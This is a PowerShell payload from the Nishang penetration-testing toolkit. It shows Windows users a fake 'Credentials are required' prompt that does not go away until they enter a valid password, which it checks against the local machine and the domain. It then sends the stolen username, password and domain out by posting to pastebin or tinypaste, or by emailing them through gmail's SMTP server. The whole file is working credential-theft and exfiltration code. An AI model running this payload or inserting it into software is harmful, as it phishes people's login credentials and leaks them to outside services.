<#
.SYNOPSIS
Nishang Payload which opens a user credential prompt.

.DESCRIPTION
This payload opens a prompt which asks for user credentials and
does not go away till valid credentials are entered in the prompt.
The credentials can then exfiltrated using method of choice.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where keys would be pasted.
Username for the tinypaste account where keys would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where keys would be pasted.
Password for the tinypaste account where keys would be pasted.
Password for the gmail account where keys would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste    

.EXAMPLE
PS > .\Credentials.ps1

.EXAMPLE
PS > .\Credentials.ps1 -exfil  <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



[CmdletBinding(DefaultParameterSetName="noexfil")]
Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
[Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
function Credentials
{
    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $script:pastevalue = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                break
            }
        }
    }
}

if($exfil -eq $True)
{
    function Do-Exfiltration
    { 
        $paste_name = $env:COMPUTERNAME + ": Credentials"
        function post_http($url,$parameters) 
        { 
            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
            $http_request.open("POST", $url, $false) 
            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
            $http_request.setRequestHeader("Content-length", $parameters.length); 
            $http_request.setRequestHeader("Connection", "close") 
            $http_request.send($parameters) 
            $script:session_key=$http_request.responseText 
        } 

        function Get-MD5()
        {
            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $utf8 = new-object -TypeName System.Text.UTF8Encoding
            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
            return $hash
        }

        if ($keyoutoption -eq "0")
        {
            $pastevalue
        }

        elseif ($keyoutoption -eq "1")
        {
            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
        }
        
        elseif ($keyoutoption -eq "2")
        {
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $smtpserver = “smtp.gmail.com”
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
            $msg.From = “$username@gmail.com”
            $msg.To.Add(”$username@gmail.com”)
            $msg.Subject = $paste_name
            $msg.Body = $pastevalue
            if ($filename)
            {
                $att = new-object Net.Mail.Attachment($filename)
                $msg.Attachments.Add($att)
            }
            $smtp.Send($msg)
        }

        elseif ($keyoutoption -eq "3")
        {
            
            $hash = Get-MD5
            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
        }

    }

    Credentials
    Do-Exfiltration
}

else
{
    Credentials
    $pastevalue
}